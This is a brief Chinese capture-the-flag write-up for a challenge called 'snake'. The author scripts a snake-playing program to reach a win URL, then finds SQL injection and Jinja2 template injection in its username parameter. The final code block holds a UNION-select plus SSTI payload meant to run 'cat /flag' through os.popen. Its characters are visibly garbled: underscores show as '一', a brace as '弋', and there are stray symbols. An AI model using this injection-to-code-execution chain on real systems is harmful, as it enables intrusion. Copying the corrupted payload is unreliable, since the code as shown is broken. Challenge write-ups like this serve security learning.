---
tags: [SQL注入, SSTI, Jinja2, RCE, 游戏自动化]
---

# snake

该题目是一个贪吃蛇程序， 在赢得比赛后会跳转到某一地址， 因此先尝试玩贪吃蛇。

![img](file:///C:\Users\87701\AppData\Local\Temp\ksohtml175892\wps9.jpg)[因为比较菜， 所以得找个AI帮忙。找到了一个看起来比较完善的AI程序： ](https://github.com/chuyangliu/snake)[https://github.com/chu](https://github.com/chuyangliu/snake)yangliu/snake

对程序做一个改造， 在生成食物时从网络获取， 并将每一步算法的计算结果发送请求到后端

到了50分之后就会得到一个获胜地址：http://eci-2zedfkwha8kg1cp0ftaz.cloudeci1.ichunqiu.com:5000/snake_win?username=crane

测了一下发现有个sql注入， 数据库是sqlite， 只有一个users表， 不好利用 。然后又测出来有一个ssti， 直接用ssti rce读flag

```
snake_win?
username=asd%27%20union+select+1 ,2 , '弋 "" .一class一 .一base一 .一subclasses一 ()
[69] ["load_module"]("os") .popen("cat+/flag") .read() B ' ;+ — +
```

